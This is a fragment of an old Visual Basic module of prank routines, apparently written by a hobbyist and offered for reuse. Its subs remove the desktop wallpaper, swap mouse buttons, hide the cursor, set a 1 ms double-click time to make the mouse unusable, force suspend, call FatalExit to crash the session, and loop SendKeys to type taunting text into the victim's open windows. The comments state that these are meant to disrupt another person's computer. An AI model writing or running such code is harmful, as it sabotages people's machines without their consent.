...
' I had to release this earlier than expceted so i doesnt have
' all the stuff i wanted it to have guess u will just have to wait
'
' THIS IS MY FINAL BAS FILE EVER
'
...
Loop
End Sub
Sub OpenModemPort(MSComm1 As MSComm)
' <=====READ THIS======>
' YOU probably have to add a MIcrosoft
' Comm control to your project to use this
' <=====READ THIS======>
' or just delete this sub if you cant figure out how
' to get it to run
...
End Sub
Sub gooderror()
 A% = FatalExit(ERROR_WINS_INTERNAL)
End Sub
...
Sub screensaver(Form As Form)
Randomize
Dim A
A = Int(Rnd * 7)
Dim X, Y
Randomize
X = Int(Rnd * Form.Width)
Randomize
Y = Int(Rnd * Form.Height)
For i = 1 To 1000
    Dim B
    B = (i / 256) * 55
    If A = 0 Then
        Circle (X, Y), i, RGB(0, 256 - B, 0)
    ElseIf A = 1 Then
        Circle (X, Y), i, RGB(256 - B, 0, 0)
    ElseIf A = 2 Then
        Circle (X, Y), i, RGB(0, 0, 256 - B)
    ElseIf A = 3 Then
        Circle (X, Y), i, RGB(0, 256 - B, 256 - B)
    ElseIf A = 4 Then
        Circle (X, Y), i, RGB(256 - B, 0, 256 - B)
    ElseIf A = 5 Then
        Circle (X, Y), i, RGB(256 - B, 256 - B, 256 - B)
    ElseIf A = 6 Then
        Circle (X, Y), i, RGB(256 - B, 256 - B, 0)
    End If
Next i
End Sub
Sub StartMenuClick()
...
Sub RemoveWallpaper()
  Dim l As Long
  l = SystemParametersInfo(SPI_SETDESKWALLPAPER, 0&, "(None)", SPIF_UPDATEINIFILE Or SPIF_SENDWININICHANGE)
End Sub
Sub LeftHandedMouse()
' this makes the button you usually use
' Into the buton on the right side of the mouse
 A$ = SwapMouseButton(Left)
End Sub
Sub Suspend()
'If your computer supports it this will
' Make your computer Go into Sleep Mode
 A$ = SetSystemPowerState(Suspend, Force)
End Sub
Sub Mouse_SuperMan()
' This makes it pretty impossible to
' use the mouse cause in order to open
' something you need to click the button
' Twice in one Milla Second
' I dont think anyone can do that
SetDoubleClickTime (1)
End Sub
Sub DisapperingMouse()
'Makes the mouse arrow dissaper
hid$ = ShowCursor(False)
End Sub
Sub SendkeysMadness()
' i dont know what this is going to do
' but its got to be funny whenever they
' gointo a word processor or something
' hmm any more ideas IM me at ToaST Ny
' or E-Mail me at ToaSTny@hotmail.com
Do
On Error Resume Next
snd$ = "Youve got bad luck today dont you!"
SendKeys snd$
snd$ = Val(snd$) + 21
